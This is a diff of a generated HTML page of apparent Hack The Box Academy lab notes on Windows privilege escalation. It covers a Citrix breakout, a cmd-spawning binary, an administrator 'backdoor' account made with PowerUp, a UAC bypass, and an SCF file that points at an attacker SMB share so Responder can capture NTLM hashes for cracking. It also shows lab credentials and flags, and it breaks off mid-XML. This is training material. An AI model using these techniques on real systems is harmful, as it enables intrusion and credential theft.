@@ -18,7 +18,7 @@
       
       
       <link rel="icon" href="../img/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.11">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
     
     
       
@@ -26,7 +26,7 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.4af4bdda.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.2afb09e1.min.css">
       
         
         <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
@@ -20302,6 +20302,12 @@
       
         
       
+        
+      
+        
+      
+        
+      
     
     
     
@@ -21472,6 +21478,75 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pillaging-windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pillaging
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../citrix-breakout/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Restricted environments- Citrix breakout
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../user-interaction-windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    User interaction
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -21767,6 +21842,15 @@
   <a href="#restricted-environments" class="md-nav__link">
     <span class="md-ellipsis">
       Restricted Environments
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#additional-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional Techniques
     </span>
   </a>
   
@@ -23550,10 +23634,489 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-140-23"><a id="__codelineno-140-23" name="__codelineno-140-23"></a># We obtained: username=&quot;tomcat&quot; password=&quot;s3cret&quot;
 </span></code></pre></div></td></tr></table></div>
 <h2 id="restricted-environments">Restricted Environments</h2>
+<p><strong>RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Submit the user flag from C:\Users\pmorgan\Downloads</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-141-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1"></a>xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>Visit <code>http://humongousretail.com/remote/</code>. Enter with creds:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-142-1">1</a></span>
+<span class="normal"><a href="#__codelineno-142-2">2</a></span>
+<span class="normal"><a href="#__codelineno-142-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1"></a>Username: pmorgan
+</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2"></a>Password: Summer1Summer!
+</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3"></a>  Domain: htb.local
+</span></code></pre></div></td></tr></table></div>
+<p>After login, click on the <code>Default Desktop</code> to obtain the Citrix <code>launch.ica</code> file in order to connect to the restricted environment.</p>
+<p>Run <code>Paint</code> from start menu and click on <code>File &gt; Open</code> to open the Dialog Box.</p>
+<p>With the windows dialog box open for paint, we can enter the <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths">UNC</a> path <code>\\127.0.0.1\c$\users\pmorgan</code> under the File name field, with File-Type set to <code>All Files</code> and upon hitting enter we gain access to the desired directory.</p>
+<p>There, right click on the flag.txt file and open it with the Note editor.</p>
+<p>Results: CitR1X_Us3R_Esc@p3</p>
+<p><strong>Submit the Administrator's flag from C:\Users\Administrator\Desktop</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-143-1">1</a></span>
+<span class="normal"><a href="#__codelineno-143-2">2</a></span>
+<span class="normal"><a href="#__codelineno-143-3">3</a></span>
+<span class="normal"><a href="#__codelineno-143-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1"></a># Entering to the windows citrix env, to return to Ubuntu use CTRL-Tab
+</span><span id="__span-143-2"><a id="__codelineno-143-2" name="__codelineno-143-2"></a># In ubuntu open a terminal
+</span><span id="__span-143-3"><a id="__codelineno-143-3" name="__codelineno-143-3"></a>sudo su
+</span><span id="__span-143-4"><a id="__codelineno-143-4" name="__codelineno-143-4"></a>cd /home/htb-student/Tools
+</span></code></pre></div></td></tr></table></div>
+<p>tart a SMB server from the Ubuntu machine using Impacket's <code>smbserver.py</code> script.</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-144-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1"></a><span class="go">smbserver.py -smb2support share $(pwd)</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Back in the Citrix environment, initiate the "Paint" application via the start menu.</p>
+<p>Within this Windows dialog box associated with Paint, input the UNC path as <code>\\10.13.38.95\share</code> into the designated "File name" field.</p>
+<p>This is a file that we have hosted there: pwn.exe. This binary is the compiled binary from pwn.c:</p>
+<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-145-1">1</a></span>
+<span class="normal"><a href="#__codelineno-145-2">2</a></span>
+<span class="normal"><a href="#__codelineno-145-3">3</a></span>
+<span class="normal"><a href="#__codelineno-145-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-145-2"><a id="__codelineno-145-2" name="__codelineno-145-2"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-145-3"><a id="__codelineno-145-3" name="__codelineno-145-3"></a><span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe&quot;</span><span class="p">);</span>
+</span><span id="__span-145-4"><a id="__codelineno-145-4" name="__codelineno-145-4"></a><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory. Now we can:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-146-1">1</a></span>
+<span class="normal"><a href="#__codelineno-146-2">2</a></span>
+<span class="normal"><a href="#__codelineno-146-3">3</a></span>
+<span class="normal"><a href="#__codelineno-146-4">4</a></span>
+<span class="normal"><a href="#__codelineno-146-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1"></a>powershell -ep bypass
+</span><span id="__span-146-2"><a id="__codelineno-146-2" name="__codelineno-146-2"></a>cd c:\Users\pmorgan\Desktop
+</span><span id="__span-146-3"><a id="__codelineno-146-3" name="__codelineno-146-3"></a>xcopy \\10.13.38.95\share\Bypass-UAC.ps1
+</span><span id="__span-146-4"><a id="__codelineno-146-4" name="__codelineno-146-4"></a>xcopy \\10.13.38.95\share\PowerUp.ps1
+</span><span id="__span-146-5"><a id="__codelineno-146-5" name="__codelineno-146-5"></a>xcopy \\10.13.38.95\share\pwn.exe
+</span></code></pre></div></td></tr></table></div>
+<p>Even though without downloading these files, we could right-click the executable and get a cmd terminal. </p>
+<p>Once we access to the terminal, we can jump to Escalating privileges.</p>
+<p>Using <code>PowerUp.ps1</code>, we find that <a href="https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">Always Install Elevated</a> key is present and set.</p>
+<p>We can also validate this using the Command Prompt by querying the corresponding registry keys:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-147-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1"></a>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></code></pre></div></td></tr></table></div>
+<p>Once more, we can make use of PowerUp, using it's <code>Write-UserAddMSI</code> function. This function facilitates the creation of an <code>.msi</code> file directly on the desktop.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-148-1">1</a></span>
+<span class="normal"><a href="#__codelineno-148-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1"></a> Import-Module .\PowerUp.ps1
+</span><span id="__span-148-2"><a id="__codelineno-148-2" name="__codelineno-148-2"></a> Write-UserAddMSI
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-149-1">1</a></span>
+<span class="normal"><a href="#__codelineno-149-2">2</a></span>
+<span class="normal"><a href="#__codelineno-149-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1"></a>Output Path
+</span><span id="__span-149-2"><a id="__codelineno-149-2" name="__codelineno-149-2"></a>-----------
+</span><span id="__span-149-3"><a id="__codelineno-149-3" name="__codelineno-149-3"></a>UserAdd.msi
+</span></code></pre></div></td></tr></table></div>
+<p>Now we can execute <code>UserAdd.msi</code> and create a new user <code>backdoor:password123.</code> under Administrators group.</p>
+<p>And:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-150-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1"></a>runas /user:backdoor cmd
+</span></code></pre></div></td></tr></table></div>
+<p>For bypassing the UAC, we will use <a href="files/Bypass-UAC.ps1">Bypass-UAC.ps1</a> from https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Bypass-UAC.ps1:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-151-1">1</a></span>
+<span class="normal"><a href="#__codelineno-151-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-151-1"><a id="__codelineno-151-1" name="__codelineno-151-1"></a>Import-Module .\Bypass-UAC.ps1
+</span><span id="__span-151-2"><a id="__codelineno-151-2" name="__codelineno-151-2"></a>Bypass-UAC -Method UacMethodSysprep
+</span></code></pre></div></td></tr></table></div>
+<p>Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command <code>whoami /all</code> or <code>whoami /priv</code>. </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-152-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-152-1"><a id="__codelineno-152-1" name="__codelineno-152-1"></a>type c:\Users\Administrator\Desktop\flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Results</strong>: C1tr!x_3sC@p3_@dm!n</p>
+<h2 id="additional-techniques">Additional Techniques</h2>
+<p><strong>RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Using the techniques in this section obtain the cleartext credentials for the SCCM_SVC user.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-153-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-153-1"><a id="__codelineno-153-1" name="__codelineno-153-1"></a>xfreerdp /v:10.129.113.114 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-154-1">1</a></span>
+<span class="normal"><a href="#__codelineno-154-2">2</a></span>
+<span class="normal"><a href="#__codelineno-154-3">3</a></span>
+<span class="normal"><a href="#__codelineno-154-4">4</a></span>
+<span class="normal"><a href="#__codelineno-154-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-154-1"><a id="__codelineno-154-1" name="__codelineno-154-1"></a>[Shell]
+</span><span id="__span-154-2"><a id="__codelineno-154-2" name="__codelineno-154-2"></a>Command=2
+</span><span id="__span-154-3"><a id="__codelineno-154-3" name="__codelineno-154-3"></a>IconFile=\\10.10.15.105\share\legit.ico
+</span><span id="__span-154-4"><a id="__codelineno-154-4" name="__codelineno-154-4"></a>[Taskbar]
+</span><span id="__span-154-5"><a id="__codelineno-154-5" name="__codelineno-154-5"></a>Command=ToggleDesktop
+</span></code></pre></div></td></tr></table></div>
+<p><strong>1.</strong> Create the file @Inventory.sfc:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-155-1">1</a></span>
+<span class="normal"><a href="#__codelineno-155-2">2</a></span>
+<span class="normal"><a href="#__codelineno-155-3">3</a></span>
+<span class="normal"><a href="#__codelineno-155-4">4</a></span>
+<span class="normal"><a href="#__codelineno-155-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-155-1"><a id="__codelineno-155-1" name="__codelineno-155-1"></a>[Shell]
+</span><span id="__span-155-2"><a id="__codelineno-155-2" name="__codelineno-155-2"></a>Command=2
+</span><span id="__span-155-3"><a id="__codelineno-155-3" name="__codelineno-155-3"></a>IconFile=\\$IPAttacker\share\legit.ico
+</span><span id="__span-155-4"><a id="__codelineno-155-4" name="__codelineno-155-4"></a>[Taskbar]
+</span><span id="__span-155-5"><a id="__codelineno-155-5" name="__codelineno-155-5"></a>Command=ToggleDesktop
+</span></code></pre></div></td></tr></table></div>
+<p><strong>2</strong>  Save it in a share:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-156-1">1</a></span>
+<span class="normal"><a href="#__codelineno-156-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-156-1"><a id="__codelineno-156-1" name="__codelineno-156-1"></a># Enumerate the local shares:
+</span><span id="__span-156-2"><a id="__codelineno-156-2" name="__codelineno-156-2"></a>Get-SmbShare
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-157-1">1</a></span>
+<span class="normal"><a href="#__codelineno-157-2">2</a></span>
+<span class="normal"><a href="#__codelineno-157-3">3</a></span>
+<span class="normal"><a href="#__codelineno-157-4">4</a></span>
+<span class="normal"><a href="#__codelineno-157-5">5</a></span>
+<span class="normal"><a href="#__codelineno-157-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-157-1"><a id="__codelineno-157-1" name="__codelineno-157-1"></a>Name              ScopeName Path                 Description
+</span><span id="__span-157-2"><a id="__codelineno-157-2" name="__codelineno-157-2"></a>----              --------- ----                 -----------
+</span><span id="__span-157-3"><a id="__codelineno-157-3" name="__codelineno-157-3"></a>ADMIN$            *         C:\Windows           Remote Admin
+</span><span id="__span-157-4"><a id="__codelineno-157-4" name="__codelineno-157-4"></a>C$                *         C:\                  Default share
+</span><span id="__span-157-5"><a id="__codelineno-157-5" name="__codelineno-157-5"></a>Department Shares *         C:\Department Shares
+</span><span id="__span-157-6"><a id="__codelineno-157-6" name="__codelineno-157-6"></a>IPC$              *                              Remote IPC
+</span></code></pre></div></td></tr></table></div>
+<p>In this case we have write permissions on <code>C:\Department Shares\Public\IT</code> . We save there @Inventory.sfc.</p>
+<p><strong>3.</strong> Start responder in the attacker machine: </p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-158-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-158-1"><a id="__codelineno-158-1" name="__codelineno-158-1"></a><span class="go">sudo python3 ./Responder.py -I tun0  -w -d</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We will get:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-159-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-159-1"><a id="__codelineno-159-1" name="__codelineno-159-1"></a>sccm_svc::WINLPE-SRV01:576fe5b6ae9591d2:70223F59AD1316DFAB43DCE951C6CA4D:010100000000000000738CE498B4DB015ABAFE6949AC79490000000002000800430050003400300001001E00570049004E002D0055005400320035004600550045004E0048005400530004003400570049004E002D0055005400320035004600550045004E004800540053002E0043005000340030002E004C004F00430041004C000300140043005000340030002E004C004F00430041004C000500140043005000340030002E004C004F00430041004C000700080000738CE498B4DB010600040002000000080030003000000000000000010000000020000020F8114B2C53009CEED83BBBC3895566AA9FF81A0BD7821F7C9DB139C50048080A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310030003500000000000000000000000000
+</span></code></pre></div></td></tr></table></div>
+<p>We save it under name <code>hash</code>.</p>
+<p><strong>3.</strong> Cracking NTLMv2 Hash with Hashcat</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-160-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-160-1"><a id="__codelineno-160-1" name="__codelineno-160-1"></a><span class="go">hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Results</strong>: Password1</p>
+<p><strong>RDP to  with user "Peter" and password "Bambi123". Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-161-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-161-1"><a id="__codelineno-161-1" name="__codelineno-161-1"></a>xfreerdp /v:10.129.190.241 /u:Peter /p:Bambi123 /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-162-1">1</a></span>
+<span class="normal"><a href="#__codelineno-162-2">2</a></span>
+<span class="normal"><a href="#__codelineno-162-3">3</a></span>
+<span class="normal"><a href="#__codelineno-162-4">4</a></span>
+<span class="normal"><a href="#__codelineno-162-5">5</a></span>
+<span class="normal"><a href="#__codelineno-162-6">6</a></span>
+<span class="normal"><a href="#__codelineno-162-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-162-1"><a id="__codelineno-162-1" name="__codelineno-162-1"></a># List existing programs
+</span><span id="__span-162-2"><a id="__codelineno-162-2" name="__codelineno-162-2"></a>$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+</span><span id="__span-162-3"><a id="__codelineno-162-3" name="__codelineno-162-3"></a>
+</span><span id="__span-162-4"><a id="__codelineno-162-4" name="__codelineno-162-4"></a>$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+</span><span id="__span-162-5"><a id="__codelineno-162-5" name="__codelineno-162-5"></a>
+</span><span id="__span-162-6"><a id="__codelineno-162-6" name="__codelineno-162-6"></a>
+</span><span id="__span-162-7"><a id="__codelineno-162-7" name="__codelineno-162-7"></a>$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+</span></code></pre></div></td></tr></table></div>
+<p>Output (example):</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-163-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-163-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-163-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-163-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-163-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-163-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-163-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-163-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-163-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-163-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-163-1"><a id="__codelineno-163-1" name="__codelineno-163-1"></a>DisplayName                                                        DisplayVersion  InstallLocation
+</span><span id="__span-163-2"><a id="__codelineno-163-2" name="__codelineno-163-2"></a>-----------                                                        --------------  ---------------
+</span><span id="__span-163-3"><a id="__codelineno-163-3" name="__codelineno-163-3"></a>DB Browser for SQLite                                              3.12.2          C:\Program Files\DB Browser for SQLite\
+</span><span id="__span-163-4"><a id="__codelineno-163-4" name="__codelineno-163-4"></a>Google Chrome                                                      105.0.5195.127  C:\Program 
+</span><span id="__span-163-5"><a id="__codelineno-163-5" name="__codelineno-163-5"></a>... SNIP ...
+</span><span id="__span-163-6"><a id="__codelineno-163-6" name="__codelineno-163-6"></a>
+</span><span id="__span-163-7"><a id="__codelineno-163-7" name="__codelineno-163-7"></a>mRemoteNG                                                          1.76.20.24615   C:\Program Files (x86)\mRemoteNG\
+</span><span id="__span-163-8"><a id="__codelineno-163-8" name="__codelineno-163-8"></a>Slack (Machine - MSI)                                              4.27.154.0
+</span><span id="__span-163-9"><a id="__codelineno-163-9" name="__codelineno-163-9"></a>
+</span><span id="__span-163-10"><a id="__codelineno-163-10" name="__codelineno-163-10"></a>... SNIP ...
+</span></code></pre></div></td></tr></table></div>
+<p>We can see the <code>mRemoteNG</code> software is installed on the system. </p>
+<p><strong>Results</strong>: mRemoteNG</p>
+<p><strong>Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace?</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-164-1">1</a></span>
+<span class="normal"><a href="#__codelineno-164-2">2</a></span>
+<span class="normal"><a href="#__codelineno-164-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-164-1"><a id="__codelineno-164-1" name="__codelineno-164-1"></a># Access the mRemoteNG config file:
+</span><span id="__span-164-2"><a id="__codelineno-164-2" name="__codelineno-164-2"></a>cd C:\Users\Peter\AppData\Roaming\mRemoteNG
+</span><span id="__span-164-3"><a id="__codelineno-164-3" name="__codelineno-164-3"></a>type confCons.xml
+</span></code></pre></div></td></tr></table></div>
+<p>mRemoteNG Configuration File - confCons.xml:</p>
+<div class="language-xml highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-165-1">1</a></span>
+<span class="normal"><a href="#__codelineno-165-2">2</a></span>
+<span class="normal"><a href="#__codelineno-165-3">3</a></span>
+<span class="normal"><a href="#__codelineno-165-4">4</a></span>
+<span class="normal"><a href="#__codelineno-165-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-165-1"><a id="__codelineno-165-1" name="__codelineno-165-1"></a><span class="cp">&lt;?XML version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+</span><span id="__span-165-2"><a id="__codelineno-165-2" name="__codelineno-165-2"></a><span class="nt">&lt;mrng:Connections</span><span class="w"> </span><span class="na">xmlns:mrng=</span><span class="s">&quot;http://mremoteng.org&quot;</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;Connections&quot;</span><span class="w"> </span><span class="na">Export=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">EncryptionEngine=</span><span class="s">&quot;AES&quot;</span><span class="w"> </span><span class="na">BlockCipherMode=</span><span class="s">&quot;GCM&quot;</span><span class="w"> </span><span class="na">KdfIterations=</span><span class="s">&quot;1000&quot;</span><span class="w"> </span><span class="na">FullFileEncryption=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">Protected=</span><span class="s">&quot;QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe&quot;</span><span class="w"> </span><span class="na">ConfVersion=</span><span class="s">&quot;2.6&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-165-3"><a id="__codelineno-165-3" name="__codelineno-165-3"></a><span class="w">    </span><span class="nt">&lt;Node</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;RDP_Domain&quot;</span><span class="w"> </span><span class="na">Type=</span><span class="s">&quot;Connection&quot;</span><span class="w"> </span><span class="na">Descr=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">Icon=</span><span class="s">&quot;mRemoteNG&quot;</span><span class="w"> </span><span class="na">Panel=</span><span class="s">&quot;General&quot;</span><span class="w"> </span><span class="na">Id=</span><span class="s">&quot;096332c1-f405-4e1e-90e0-fd2a170beeb5&quot;</span><span class="w"> </span><span class="na">Username=</span><span class="s">&quot;administrator&quot;</span><span class="w"> </span><span class="na">Domain=</span><span class="s">&quot;test.local&quot;</span><span class="w"> </span><span class="na">Password=</span><span class="s">&quot;sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==&quot;</span><span class="w"> </span><span class="na">Hostname=</span><span class="s">&quot;10.0.0.10&quot;</span><span class="w"> </span><span class="na">Protocol=</span><span class="s">&quot;RDP&quot;</span><span class="w"> </span><span class="na">PuttySession=</span><span class="s">&quot;Default Settings&quot;</span><span class="w"> </span><span class="na">Port=</span><span class="s">&quot;3389&quot;</span>
+</span><span id="__span-165-4"><a id="__codelineno-165-4" name="__codelineno-165-4"></a><span class="w">    </span><span class="err">..SNIP..</span>
+</span><span id="__span-165-5"><a id="__codelineno-165-5" name="__codelineno-165-5"></a><span class="err">&lt;/Connections</span><span class="nt">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>This XML document contains a root element called <code>Connections</code> with the information about the encryption used for the credentials and the attribute <code>Protected</code>, which corresponds to the master password used to encrypt the document.</p>
+<p>We can use this string to attempt to crack the master password. We will find some elements named <code>Node</code> within the root element.</p>
+<div class="language-xml highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-166-1">1</a></span>
+<span class="normal"><a href="#__codelineno-166-2">2</a></span>
+<span class="normal"><a href="#__codelineno-166-3">3</a></span>
+<span class="normal"><a href="#__codelineno-166-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-166-1"><a id="__codelineno-166-1" name="__codelineno-166-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-166-2"><a id="__codelineno-166-2" name="__codelineno-166-2"></a>
+</span><span id="__span-166-3"><a id="__codelineno-166-3" name="__codelineno-166-3"></a>[<span class="nt">&lt;mrng:Connections</span><span class="w"> </span><span class="na">ConfVersion=</span><span class="s">&quot;2.6&quot;</span><span class="w"> </span><span class="na">Protected=</span><span class="s">&quot;AllGNAWw3JJdXFuMG06ssHKpMbWw7AHXKWZVidfNIu5LNVm2nzroKSKtYYfsK66/itwh95OaYLtEX8NA7xy7IMwr&quot;</span><span class="w"> </span><span class="na">FullFileEncryption=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">KdfIterations=</span><span class="s">&quot;1000&quot;</span><span class="w"> </span><span class="na">BlockCipherMode=</span><span class="s">&quot;GCM&quot;</span><span class="w"> </span><span class="na">EncryptionEngine=</span><span class="s">&quot;AES&quot;</span><span class="w"> </span><span class="na">Export=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;Connections&quot;</span><span class="w"> </span><span class="na">xmlns:mrng=</span><span class="s">&quot;http://mremoteng.org&quot;</span><span class="nt">&gt;</span>](file:///C:/Users/Peter/AppData/Roaming/mRemoteNG/confCons.xml#)
